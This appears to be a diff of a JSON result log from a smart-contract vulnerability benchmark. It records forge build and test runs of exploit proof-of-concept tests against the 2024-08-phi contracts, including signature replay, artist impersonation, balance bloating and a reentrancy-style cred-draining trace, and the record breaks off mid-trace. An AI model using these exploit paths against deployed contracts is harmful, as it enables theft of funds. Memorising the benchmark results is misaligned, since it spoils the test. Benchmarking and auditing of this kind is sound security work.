@@ -1,9 +1,306 @@
 {
+  "all_exploits_blocked_on_fixed": true,
+  "base_commit": "c9cce9061fd19c2d80835c185cb43ba2fc82cecb",
   "candidate_id": "reevmbench:audits/2024-08-phi",
-  "command": null,
-  "exit_code": null,
-  "forge_status": "no_foundry_project",
-  "generated_at": "2026-11-20T09:44:58Z",
+  "clone": {
+    "attempts": [
+      {
+        "command": null,
+        "exit_code": 0,
+        "stderr_tail": "",
+        "stdout_tail": "",
+        "step": "reuse_existing_clone"
+      },
+      {
+        "command": "\"C:\\Program Files\\Git\\cmd\\git.EXE\" -C C:\\Users\\REDACTED\\Downloads\\vlun-data-main\\vlun-data-main\\work\\wave1_runs\\reevmbench\\reevmbench__audits__2024-08-phi\\checkout config core.longpaths true",
+        "exit_code": 0,
+        "stderr_tail": "",
+        "stdout_tail": "",
+        "step": "git_config_longpaths",
+        "timed_out": false,
+        "tool_missing": false
+      },
+      {
+        "command": "\"C:\\Program Files\\Git\\cmd\\git.EXE\" -C C:\\Users\\REDACTED\\Downloads\\vlun-data-main\\vlun-data-main\\work\\wave1_runs\\reevmbench\\reevmbench__audits__2024-08-phi\\checkout rev-parse HEAD",
+        "exit_code": 0,
+        "stderr_tail": "",
+        "stdout_tail": "c9cce9061fd19c2d80835c185cb43ba2fc82cecb\n",
+        "step": "rev_parse_head",
+        "timed_out": false,
+        "tool_missing": false
+      },
+      {
+        "command": "\"C:\\Program Files\\Git\\cmd\\git.EXE\" -C C:\\Users\\REDACTED\\Downloads\\vlun-data-main\\vlun-data-main\\work\\wave1_runs\\reevmbench\\reevmbench__audits__2024-08-phi\\checkout cat-file -t c9cce9061fd19c2d80835c185cb43ba2fc82cecb",
+        "exit_code": 0,
+        "stderr_tail": "",
+        "stdout_tail": "commit\n",
+        "step": "cat_file_commit",
+        "timed_out": false,
+        "tool_missing": false
+      },
+      {
+        "command": "\"C:\\Program Files\\Git\\cmd\\git.EXE\" -C C:\\Users\\REDACTED\\Downloads\\vlun-data-main\\vlun-data-main\\work\\wave1_runs\\reevmbench\\reevmbench__audits__2024-08-phi\\checkout checkout --quiet --force --detach c9cce9061fd19c2d80835c185cb43ba2fc82cecb",
+        "exit_code": 0,
+        "stderr_tail": "",
+        "stdout_tail": "",
+        "step": "git_checkout_commit",
+        "timed_out": false,
+        "tool_missing": false
+      }
+    ],
+    "checked_out_commit": "c9cce9061fd19c2d80835c185cb43ba2fc82cecb",
+    "destination": "C:\\Users\\REDACTED\\Downloads\\vlun-data-main\\vlun-data-main\\work\\wave1_runs\\reevmbench\\reevmbench__audits__2024-08-phi\\checkout",
+    "head": "c9cce9061fd19c2d80835c185cb43ba2fc82cecb",
+    "ok": true,
+    "requested_commit": "c9cce9061fd19c2d80835c185cb43ba2fc82cecb",
+    "url": "https://github.com/evmbench-org/2024-08-phi.git"
+  },
+  "clone_urls_attempted": [
+    "https://github.com/evmbench-org/2024-08-phi.git",
+    "https://github.com/evmbench-org/2024-08-phi-findings.git",
+    "https://github.com/code-423n4/2024-08-phi.git",
+    "https://github.com/code-423n4/2024-08-phi-findings.git"
+  ],
+  "command": "C:\\Users\\REDACTED\\foundry\\forge.EXE build --root C:\\Users\\REDACTED\\Downloads\\vlun-data-main\\vlun-data-main\\work\\wave1_runs\\reevmbench\\reevmbench__audits__2024-08-phi\\checkout",
+  "commands": [
+    "C:\\Users\\REDACTED\\foundry\\forge.EXE build --root C:\\Users\\REDACTED\\Downloads\\vlun-data-main\\vlun-data-main\\work\\wave1_runs\\reevmbench\\reevmbench__audits__2024-08-phi\\checkout",
+    "C:\\Users\\REDACTED\\foundry\\forge.EXE test --root C:\\Users\\REDACTED\\Downloads\\vlun-data-main\\vlun-data-main\\work\\wave1_runs\\reevmbench\\reevmbench__audits__2024-08-phi\\checkout --match-test testKuprum_Claim_with_Signature_Replay -vvv",
+    "C:\\Users\\REDACTED\\foundry\\forge.EXE test --root C:\\Users\\REDACTED\\Downloads\\vlun-data-main\\vlun-data-main\\work\\wave1_runs\\reevmbench\\reevmbench__audits__2024-08-phi\\checkout --match-test testKuprum_ImpersonateArtist -vvv",
+    "C:\\Users\\REDACTED\\foundry\\forge.EXE test --root C:\\Users\\REDACTED\\Downloads\\vlun-data-main\\vlun-data-main\\work\\wave1_runs\\reevmbench\\reevmbench__audits__2024-08-phi\\checkout --match-test testBloatingBalances --gas-limit 2000000000 --isolate -vvv",
+    "C:\\Users\\REDACTED\\foundry\\forge.EXE test --root C:\\Users\\REDACTED\\Downloads\\vlun-data-main\\vlun-data-main\\work\\wave1_runs\\reevmbench\\reevmbench__audits__2024-08-phi\\checkout --match-test testCredDraining -vvv",
+    "C:\\Users\\REDACTED\\foundry\\forge.EXE test --root C:\\Users\\REDACTED\\Downloads\\vlun-data-main\\vlun-data-main\\work\\wave1_runs\\reevmbench\\reevmbench__audits__2024-08-phi\\fixed --match-test testKuprum_Claim_with_Signature_Replay -vvv",
+    "C:\\Users\\REDACTED\\foundry\\forge.EXE test --root C:\\Users\\REDACTED\\Downloads\\vlun-data-main\\vlun-data-main\\work\\wave1_runs\\reevmbench\\reevmbench__audits__2024-08-phi\\fixed --match-test testKuprum_ImpersonateArtist -vvv",
+    "C:\\Users\\REDACTED\\foundry\\forge.EXE test --root C:\\Users\\REDACTED\\Downloads\\vlun-data-main\\vlun-data-main\\work\\wave1_runs\\reevmbench\\reevmbench__audits__2024-08-phi\\fixed --match-test testBloatingBalances --gas-limit 2000000000 --isolate -vvv",
+    "C:\\Users\\REDACTED\\foundry\\forge.EXE test --root C:\\Users\\REDACTED\\Downloads\\vlun-data-main\\vlun-data-main\\work\\wave1_runs\\reevmbench\\reevmbench__audits__2024-08-phi\\fixed --match-test testCredDraining -vvv"
+  ],
+  "config_summary": {
+    "base_commit": "c9cce9061fd19c2d80835c185cb43ba2fc82cecb",
+    "default_test_flags": null,
+    "framework": "foundry",
+    "id": "2024-08-phi",
+    "run_cmd_dir": null,
+    "vulnerabilities_total": 6,
+    "vulnerabilities_with_tests": 4
+  },
+  "exit_code": 0,
+  "exit_codes": [
+    0,
+    0,
+    0,
+    1,
+    0,
+    1,
+    1,
+    0,
+    1
+  ],
+  "fixed": {
+    "build": {
+      "command": "C:\\Users\\REDACTED\\foundry\\forge.EXE build --root C:\\Users\\REDACTED\\Downloads\\vlun-data-main\\vlun-data-main\\work\\wave1_runs\\reevmbench\\reevmbench__audits__2024-08-phi\\fixed",
+      "exit_code": 0,
+      "stderr_tail": "tps://getfoundry.sh/forge/linting/reentrancy-events\n\nwarning[require-revert-in-loop]: `require` or `revert` inside a loop\n    â•­â–¸ src/Cred.sol:701:54\n    â”‚\n701 â”‚         if (_credIdsPerAddress[sender_].length == 0) revert EmptyArray();\n    â”‚                                                      â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�\n    â”‚\n    â•° help: https://getfoundry.sh/forge/linting/require-revert-in-loop\n\nwarning[require-revert-in-loop]: `require` or `revert` inside a loop\n    â•­â–¸ src/Cred.sol:706:66\n    â”‚\n706 â”‚         if (indexToRemove >= _credIdsPerAddress[sender_].length) revert IndexOutofBounds();\n    â”‚                                                                  â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�\n    â”‚\n    â•° help: https://getfoundry.sh/forge/linting/require-revert-in-loop\n\nwarning[require-revert-in-loop]: `require` or `revert` inside a loop\n    â•­â–¸ src/Cred.sol:710:40\n    â”‚\n710 â”‚         if (credId_ != credIdToRemove) revert WrongCredId();\n    â”‚                                        â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�\n    â”‚\n    â•° help: https://getfoundry.sh/forge/linting/require-revert-in-loop\n\nwarning[require-revert-in-loop]: `require` or `revert` inside a loop\n    â•­â–¸ src/Cred.sol:766:21\n    â”‚\n766 â”‚ â”�                     revert ShareLockPeriodNotPassed(\n767 â”‚ â”ƒ                         block.timestamp, lastTradeTimestamp[credId][curator] + SHARE_LOCK_PERIOD\n768 â”‚ â”ƒ                     );\n    â”‚ â”—â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”›\n    â”‚\n    â•° help: https://getfoundry.sh/forge/linting/require-revert-in-loop\n\nwarning[unsafe-typecast]: typecast can truncate values\n    â•­â–¸ src/Cred.sol:781:40\n    â”‚\n781 â”‚                 creds[credId].creator, bytes4(keccak256(\"CREATOR_ROYALTY_FEE\")), \"\"\n    â”‚                                        â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�\n    â”‚\n    â”œ note: consider disabling this lint if you're certain the cast is safe\n    â”‚       \n    â”‚       // casting to 'bytes4' is safe because [explain why]\n    â”‚       // forge-lint: disable-next-line(unsafe-typecast)\n    â”‚       \n    â”‚       \n    â•° help: https://getfoundry.sh/forge/linting/unsafe-typecast\n\nwarning[calls-loop]: external call inside a loop\n    â•­â–¸ src/Cred.sol:862:17\n    â”‚\n862 â”‚                 IBondingCurve(cred.bondingCurve).getPriceData(credId, cred.currentSupply, amount, isBuy);\n    â”‚                 â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�\n    â”‚\n    â•° help: https://getfoundry.sh/forge/linting/calls-loop\n\nwarning[require-revert-in-loop]: `require` or `revert` inside a loop\n    â•­â–¸ src/Cred.sol:846:17\n    â”‚\n846 â”‚                 revert InvalidAmount();\n    â”‚                 â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�\n    â”‚\n    â•° help: https://getfoundry.sh/forge/linting/require-revert-in-loop\n\nwarning[require-revert-in-loop]: `require` or `revert` inside a loop\n    â•­â–¸ src/Cred.sol:849:17\n    â”‚\n849 â”‚                 revert InvalidCredId();\n    â”‚                 â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�\n    â”‚\n    â•° help: https://getfoundry.sh/forge/linting/require-revert-in-loop\n\nwarning[require-revert-in-loop]: `require` or `revert` inside a loop\n    â•­â–¸ src/Cred.sol:854:21\n    â”‚\n854 â”‚                     revert DuplicateCredId();\n    â”‚                     â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�\n    â”‚\n    â•° help: https://getfoundry.sh/forge/linting/require-revert-in-loop\n\nwarning[require-revert-in-loop]: `require` or `revert` inside a loop\n    â•­â–¸ src/Cred.sol:866:21\n    â”‚\n866 â”‚                     revert PriceExceedsLimit();\n    â”‚                     â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�\n    â”‚\n    â•° help: https://getfoundry.sh/forge/linting/require-revert-in-loop\n\nwarning[require-revert-in-loop]: `require` or `revert` inside a loop\n    â•­â–¸ src/Cred.sol:869:21\n    â”‚\n869 â”‚                     revert MaxSupplyReached();\n    â”‚                     â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�\n    â”‚\n    â•° help: https://getfoundry.sh/forge/linting/require-revert-in-loop\n\nwarning[require-revert-in-loop]: `require` or `revert` inside a loop\n    â•­â–¸ src/Cred.sol:873:21\n    â”‚\n873 â”‚                     revert PriceBelowLimit();\n    â”‚                     â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�\n    â”‚\n    â•° help: https://getfoundry.sh/forge/linting/require-revert-in-loop\n\nwarning[require-revert-in-loop]: `require` or `revert` inside a loop\n    â•­â–¸ src/Cred.sol:877:21\n    â”‚\n877 â”‚                     revert InsufficientShares();\n    â”‚                     â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�\n    â”‚\n    â•° help: https://getfoundry.sh/forge/linting/require-revert-in-loop\n\nwarning[environment-read-across-mutation]: `block.timestamp` may be reused across `vm.warp`\n    â•­â–¸ test/CuratorRewardsDistributor.t.sol:135:21\n    â”‚\n135 â”‚             vm.warp(block.timestamp + 10 minutes + 1 seconds);\n    â”‚             â”€â”€â”€â”€â”€â”€â”€â”€â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”�â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ `vm.warp` changes this environment here\n    â”‚\n    â”œ help: capture it with `vm.getBlockTimestamp()` instead\n    â•° help: https://getfoundry.sh/forge/linting/environment-read-across-mutation\n\n",
+      "stdout_tail": "Compiling 114 files with Solc 0.8.25\nSolc 0.8.25 finished in 12.74s\nCompiler run successful with warnings:\nWarning (2018): Function state mutability can be restricted to view\n  --> test/DeployAndUpgradeTest.t.sol:19:5:\n   |\n19 |     function testPhiFactory() public {\n   |     ^ (Relevant source part starts here and spans across multiple lines).\n\nWarning (2018): Function state mutability can be restricted to view\n   --> test/RewardControl.t.sol:126:5:\n    |\n126 |     function _signMint(\n    |     ^ (Relevant source part starts here and spans across multiple lines).\n\n",
+      "timed_out": false,
+      "tool_missing": false
+    },
+    "dependency_install": {
+      "command": "\"C:\\Program Files\\nodejs\\npm.cmd\" install --ignore-scripts --no-audit --no-fund",
+      "exit_code": 0,
+      "stderr_tail": "npm warn deprecated inflight@1.0.6: This module is not supported, and leaks memory. Do not use it. Check out lru-cache if you want a good and tested way to coalesce async requests by a key value, which is much more comprehensive and powerful.\nnpm warn deprecated glob@8.1.0: Old versions of glob are not supported, and contain widely publicized security vulnerabilities, which have been fixed in the current version. Please update. Support for old versions may be purchased (at exorbitant rates) by contacting i@izs.me\nnpm warn deprecated uuid@9.0.1: uuid@10 and below is no longer supported.  For ESM codebases, update to uuid@latest.  For CommonJS codebases, use uuid@11 (but be aware this version will likely be deprecated in 2028).\n",
+      "stdout_tail": "\nadded 233 packages in 17s\n",
+      "timed_out": false,
+      "tool_missing": false
+    },
+    "forge_status": "exploit_success",
+    "project_root": "C:\\Users\\REDACTED\\Downloads\\vlun-data-main\\vlun-data-main\\work\\wave1_runs\\reevmbench\\reevmbench__audits__2024-08-phi\\fixed",
+    "tests": [
+      {
+        "command": "C:\\Users\\REDACTED\\foundry\\forge.EXE test --root C:\\Users\\REDACTED\\Downloads\\vlun-data-main\\vlun-data-main\\work\\wave1_runs\\reevmbench\\reevmbench__audits__2024-08-phi\\fixed --match-test testKuprum_Claim_with_Signature_Replay -vvv",
+        "exit_code": 1,
+        "exploit_success": false,
+        "failed": true,
+        "passed": false,
+        "ran": true,
+        "rpc_indicated": false,
+        "stderr_tail": "",
+        "stdout_tail": "No files changed, compilation skipped\n\nRan 1 test for test/Claimable.t.sol:TestClaimable\n[FAIL: AddressNotSigned()] testKuprum_Claim_with_Signature_Replay() (gas: 93651)\nTraces:\n  [93651] TestClaimable::testKuprum_Claim_with_Signature_Replay()\n    â”œâ”€ [0] VM::assertNotEq(31337 [3.133e4], 99999 [9.999e4]) [staticcall]\n    â”‚   â””â”€ â†� [Return]\n    â”œâ”€ [0] VM::sign(\"<pk>\", 0xc5ac1aa6af925623b1be79067dc1fa50378b09d739b15c38cf581c0308724315) [staticcall]\n    â”‚   â””â”€ â†� [Return] 28, 0x8de783f43e3ba977e5fb3cced249fe01fb9289a455552be4155aa7375ddc73a6, 0x076767164a6527492edf1824d74857ab6c1267a73322f2706d2188cb42749552\n    â”œâ”€ [0] VM::warp(1000001 [1e6])\n    â”‚   â””â”€ â†� [Return]\n    â”œâ”€ [0] VM::startPrank(participant: [0x426eDFE017AE01898D388C899A66F067124AC23B], participant: [0x426eDFE017AE01898D388C899A66F067124AC23B])\n    â”‚   â””â”€ â†� [Return]\n    â”œâ”€ [21748] 0x81af2f65B71Da9cc0e5f04f782D0a5583b2B64a0::getArtMintFee(1, 1) [staticcall]\n    â”‚   â”œâ”€ [19074] PhiFactory::getArtMintFee(1, 1) [delegatecall]\n    â”‚   â”‚   â”œâ”€ [9205] PhiRewards::computeMintReward(1, 10000000000000000 [1e16]) [staticcall]\n    â”‚   â”‚   â”‚   â””â”€ â†� [Return] 10250000000000000 [1.025e16]\n    â”‚   â”‚   â””â”€ â†� [Return] 10450000000000000 [1.045e16]\n    â”‚   â””â”€ â†� [Return] 10450000000000000 [1.045e16]\n    â”œâ”€ [37860] 0x81af2f65B71Da9cc0e5f04f782D0a5583b2B64a0::signatureClaim{value: 10450000000000000}(0x8de783f43e3ba977e5fb3cced249fe01fb9289a455552be4155aa7375ddc73a6876767164a6527492edf1824d74857ab6c1267a73322f2706d2188cb42749552, 0x00000000000000000000000000000000000000000000000000000000001093c0000000000000000000000000426edfe017ae01898d388c899a66f067124ac23b000000000000000000000000bbd0f905b1ab8868f461976c520e518a623c010000000000000000000000000085d901fa99f2c211f80818b00078c8d8f98471470000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000001869f3100000000000000000000000000000000000000000000000000000000000000, MintArgs({ tokenId: 1, quantity: 1, imageURI: \"ART_ID_URL_STRING\" }))\n    â”‚   â”œâ”€ [9705] PhiFactory::signatureClaim{value: 10450000000000000}(0x8de783f43e3ba977e5fb3cced249fe01fb9289a455552be4155aa7375ddc73a6876767164a6527492edf1824d74857ab6c1267a73322f2706d2188cb42749552, 0x00000000000000000000000000000000000000000000000000000000001093c0000000000000000000000000426edfe017ae01898d388c899a66f067124ac23b000000000000000000000000bbd0f905b1ab8868f461976c520e518a623c010000000000000000000000000085d901fa99f2c211f80818b00078c8d8f98471470000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000001869f3100000000000000000000000000000000000000000000000000000000000000, MintArgs({ tokenId: 1, quantity: 1, imageURI: \"ART_ID_URL_STRING\" })) [delegatecall]\n    â”‚   â”‚   â”œâ”€ [3000] PRECOMPILES::ecrecover(0xd97ed4bc4e96cfdcfb771e778a4e11b4a21e10362e182f23a7e8077e66ce7641, 28, 64185164035756689490199459242486896692265107725071766276373735295167479182246, 3348886668582306113451559986482043489709353629038202688002924069055276291410) [staticcall]\n    â”‚   â”‚   â”‚   â””â”€ â†� [Return] 0x022192acD4311A244bcB7EcB0d45cA8Fd206Df5C\n    â”‚   â”‚   â””â”€ â†� [Revert] AddressNotSigned()\n    â”‚   â””â”€ â†� [Revert] AddressNotSigned()\n    â””â”€ â†� [Revert] AddressNotSigned()\n\nBacktrace:\n  at PhiFactory.signatureClaim\n  at 0x81af2f65B71Da9cc0e5f04f782D0a5583b2B64a0.signatureClaim\n  at TestClaimable.testKuprum_Claim_with_Signature_Replay\n\nSuite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 3.64ms (243.40Âµs CPU time)\n\nRan 1 test suite in 15.62ms (3.64ms CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)\n\nFailing tests:\nEncountered 1 failing test in test/Claimable.t.sol:TestClaimable\n[FAIL: AddressNotSigned()] testKuprum_Claim_with_Signature_Replay() (gas: 93651)\n\nEncountered a total of 1 failing tests, 0 tests succeeded\n\nTip: Run `forge test --rerun` to retry only the 1 failed test\nTip: Run `forge test --debug --match-test <TEST_NAME>` to inspect one failing test in the debugger\n",
+        "test_name": "testKuprum_Claim_with_Signature_Replay",
+        "timed_out": false,
+        "tool_missing": false,
+        "vulnerability": "H-01"
+      },
+      {
+        "command": "C:\\Users\\REDACTED\\foundry\\forge.EXE test --root C:\\Users\\REDACTED\\Downloads\\vlun-data-main\\vlun-data-main\\work\\wave1_runs\\reevmbench\\reevmbench__audits__2024-08-phi\\fixed --match-test testKuprum_ImpersonateArtist -vvv",
+        "exit_code": 1,
+        "exploit_success": false,
+        "failed": true,
+        "passed": false,
+        "ran": true,
+        "rpc_indicated": false,
+        "stderr_tail": "",
+        "stdout_tail": "tartTime: 1000000 [1e6], maxSupply: 300, mintFee: 10000000000000000 [1e16], soulBounded: false }))\n    â”‚   â”œâ”€ [16887] PhiFactory::createArt{value: 200000000000000}(0x00000000000000000000000000000000000000000000000000000000000f42a4000000000000000000000000000000000000000000000000000000000000006000000000000000000000000000000000000000000000000000000000000000a0000000000000000000000000000000000000000000000000000000000000000d73616d706c652d6172742d69640000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000e000000000000000000000000000000000000000000000000000000000000000010000000000000000000000007c8999dc9a822c1f0df42023113edb4fdd54326600000000000000000000000000000000000000000000000000000000000000a00000000000000000000000000000000000000000000000000000000000007a69000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000095349474e41545552450000000000000000000000000000000000000000000000, 0x61d3633d8d4a1e86332c47b39cffc09a9ee5bd98953e4ae5afe11c271420cb203524bad3ce059fb064199527501196cd2e77947f5c18d37ad1c44a49434cf783, CreateConfig({ artist: 0x6De8CC13160AFDF6afFa8B62EA7D9D508138c725, receiver: 0x29E3b139f4393aDda86303fcdAa35F60Bb7092bF, endTime: 1000000000 [1e9], startTime: 1000000 [1e6], maxSupply: 300, mintFee: 10000000000000000 [1e16], soulBounded: false })) [delegatecall]\n    â”‚   â”‚   â”œâ”€ [3000] PRECOMPILES::ecrecover(0x40cff835c07024a82354b1dbaa2f4589f29d781564c53c136fb0a389e171f1c5, 27, 44247835975569681737863226325175797311670036707488611979323346790160363735840, 24037476904311035808093456508912818240156733932378122157825577174992478336899) [staticcall]\n    â”‚   â”‚   â”‚   â””â”€ â†� [Return] 0x5B88560397647b99B77A009eE10De49785dD475b\n    â”‚   â”‚   â””â”€ â†� [Revert] AddressNotSigned()\n    â”‚   â””â”€ â†� [Revert] AddressNotSigned()\n    â”œâ”€ [46233] 0x81af2f65B71Da9cc0e5f04f782D0a5583b2B64a0::createArt{value: 200000000000000}(0x00000000000000000000000000000000000000000000000000000000000f42a4000000000000000000000000000000000000000000000000000000000000006000000000000000000000000000000000000000000000000000000000000000a0000000000000000000000000000000000000000000000000000000000000000d73616d706c652d6172742d69640000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000e000000000000000000000000000000000000000000000000000000000000000010000000000000000000000007c8999dc9a822c1f0df42023113edb4fdd54326600000000000000000000000000000000000000000000000000000000000000a00000000000000000000000000000000000000000000000000000000000007a69000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000095349474e41545552450000000000000000000000000000000000000000000000, 0xb5858cd514715a4a1f98b5a8e77216e8ba6f7334e9df50ac276a17dfd778ce0c0572d2b676355cb9d34858557e3b73934f155585264ffab2cc95f197e833d845, CreateConfig({ artist: 0x6De8CC13160AFDF6afFa8B62EA7D9D508138c725, receiver: 0x29E3b139f4393aDda86303fcdAa35F60Bb7092bF, endTime: 1000000000 [1e9], startTime: 1000000 [1e6], maxSupply: 300, mintFee: 10000000000000000 [1e16], soulBounded: false }))\n    â”‚   â”œâ”€ [16887] PhiFactory::createArt{value: 200000000000000}(0x00000000000000000000000000000000000000000000000000000000000f42a4000000000000000000000000000000000000000000000000000000000000006000000000000000000000000000000000000000000000000000000000000000a0000000000000000000000000000000000000000000000000000000000000000d73616d706c652d6172742d69640000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000e000000000000000000000000000000000000000000000000000000000000000010000000000000000000000007c8999dc9a822c1f0df42023113edb4fdd54326600000000000000000000000000000000000000000000000000000000000000a00000000000000000000000000000000000000000000000000000000000007a69000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000095349474e41545552450000000000000000000000000000000000000000000000, 0xb5858cd514715a4a1f98b5a8e77216e8ba6f7334e9df50ac276a17dfd778ce0c0572d2b676355cb9d34858557e3b73934f155585264ffab2cc95f197e833d845, CreateConfig({ artist: 0x6De8CC13160AFDF6afFa8B62EA7D9D508138c725, receiver: 0x29E3b139f4393aDda86303fcdAa35F60Bb7092bF, endTime: 1000000000 [1e9], startTime: 1000000 [1e6], maxSupply: 300, mintFee: 10000000000000000 [1e16], soulBounded: false })) [delegatecall]\n    â”‚   â”‚   â”œâ”€ [3000] PRECOMPILES::ecrecover(0x40cff835c07024a82354b1dbaa2f4589f29d781564c53c136fb0a389e171f1c5, 27, 82104588242296808620242492687207196967135414364765932761121251588552068222476, 2464439094192989552269701753771945100974952901574259305185719626548081055813) [staticcall]\n    â”‚   â”‚   â”‚   â””â”€ â†� [Return] 0xA5a6C7fdCec2Aa044a45b58a7eA2891afF6D8cb7\n    â”‚   â”‚   â””â”€ â†� [Revert] AddressNotSigned()\n    â”‚   â””â”€ â†� [Revert] AddressNotSigned()\n    â”œâ”€ [0] VM::assertTrue(false, \"attacker front-run should succeed on vulnerable code\") [staticcall]\n    â”‚   â””â”€ â†� [Revert] attacker front-run should succeed on vulnerable code\n    â””â”€ â†� [Revert] attacker front-run should succeed on vulnerable code\n\nBacktrace:\n  at PhiFactory.createArt\n  at 0x81af2f65B71Da9cc0e5f04f782D0a5583b2B64a0.createArt\n  at TestPhiFactory.testKuprum_ImpersonateArtist\n\nSuite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 2.93ms (390.80Âµs CPU time)\n\nRan 1 test suite in 14.70ms (2.93ms CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)\n\nFailing tests:\nEncountered 1 failing test in test/PhiFactory.t.sol:TestPhiFactory\n[FAIL: attacker front-run should succeed on vulnerable code] testKuprum_ImpersonateArtist() (gas: 152777)\n\nEncountered a total of 1 failing tests, 0 tests succeeded\n\nTip: Run `forge test --rerun` to retry only the 1 failed test\nTip: Run `forge test --debug --match-test <TEST_NAME>` to inspect one failing test in the debugger\n",
+        "test_name": "testKuprum_ImpersonateArtist",
+        "timed_out": false,
+        "tool_missing": false,
+        "vulnerability": "H-02"
+      },
+      {
+        "command": "C:\\Users\\REDACTED\\foundry\\forge.EXE test --root C:\\Users\\REDACTED\\Downloads\\vlun-data-main\\vlun-data-main\\work\\wave1_runs\\reevmbench\\reevmbench__audits__2024-08-phi\\fixed --match-test testBloatingBalances --gas-limit 2000000000 --isolate -vvv",
+        "exit_code": 0,
+        "exploit_success": true,
+        "failed": false,
+        "passed": true,
+        "ran": true,
+        "rpc_indicated": false,
+        "stderr_tail": "",
+        "stdout_tail": "No files changed, compilation skipped\n\nRan 1 test for test/CuratorRewardsDistributor.t.sol:CuratorRewardsDistributorTest\n[PASS] testBloatingBalances() (gas: 1637330964)\nSuite result: ok. 1 passed; 0 failed; 0 skipped; finished in 20.65s (20.65s CPU time)\n\nRan 1 test suite in 20.65s (20.65s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)\n",
+        "test_name": "testBloatingBalances",
+        "timed_out": false,
+        "tool_missing": false,
+        "vulnerability": "H-03"
+      },
+      {
+        "command": "C:\\Users\\REDACTED\\foundry\\forge.EXE test --root C:\\Users\\REDACTED\\Downloads\\vlun-data-main\\vlun-data-main\\work\\wave1_runs\\reevmbench\\reevmbench__audits__2024-08-phi\\fixed --match-test testCredDraining -vvv",
+        "exit_code": 1,
+        "exploit_success": false,
+        "failed": true,
+        "passed": false,
+        "ran": true,
+        "rpc_indicated": false,
+        "stderr_tail": "",
+        "stdout_tail": "‚   â”‚   â”‚   â””â”€ â†� [Return] 500\n    â”‚   â”‚   â”‚   â”‚   â”œâ”€ [825] 0xfB6e58A05a05fb69893d88F67710491E3e109c8E::getCreatorRoyalty(2) [staticcall]\n    â”‚   â”‚   â”‚   â”‚   â”‚   â”œâ”€ [654] Cred::getCreatorRoyalty(2) [delegatecall]\n    â”‚   â”‚   â”‚   â”‚   â”‚   â”‚   â””â”€ â†� [Return] 0, 0\n    â”‚   â”‚   â”‚   â”‚   â”‚   â””â”€ â†� [Return] 0, 0\n    â”‚   â”‚   â”‚   â”‚   â””â”€ â†� [Return] 10000000000000 [1e13], 500000000000 [5e11], 0\n    â”‚   â”‚   â”‚   â”œâ”€ [35103] Attacker::receive{value: 1499989500000000000}()\n    â”‚   â”‚   â”‚   â”‚   â”œâ”€ [27583] 0xfB6e58A05a05fb69893d88F67710491E3e109c8E::buyShareCred{value: 100000000000000000}(2, 900, 0)\n    â”‚   â”‚   â”‚   â”‚   â”‚   â”œâ”€ [27404] Cred::buyShareCred{value: 100000000000000000}(2, 900, 0) [delegatecall]\n    â”‚   â”‚   â”‚   â”‚   â”‚   â”‚   â”œâ”€ [3580] FixedPriceBondingCurve::getPriceData(2, 1, 900, true) [staticcall]\n    â”‚   â”‚   â”‚   â”‚   â”‚   â”‚   â”‚   â”œâ”€ [579] 0xfB6e58A05a05fb69893d88F67710491E3e109c8E::protocolFeePercent() [staticcall]\n    â”‚   â”‚   â”‚   â”‚   â”‚   â”‚   â”‚   â”‚   â”œâ”€ [417] Cred::protocolFeePercent() [delegatecall]\n    â”‚   â”‚   â”‚   â”‚   â”‚   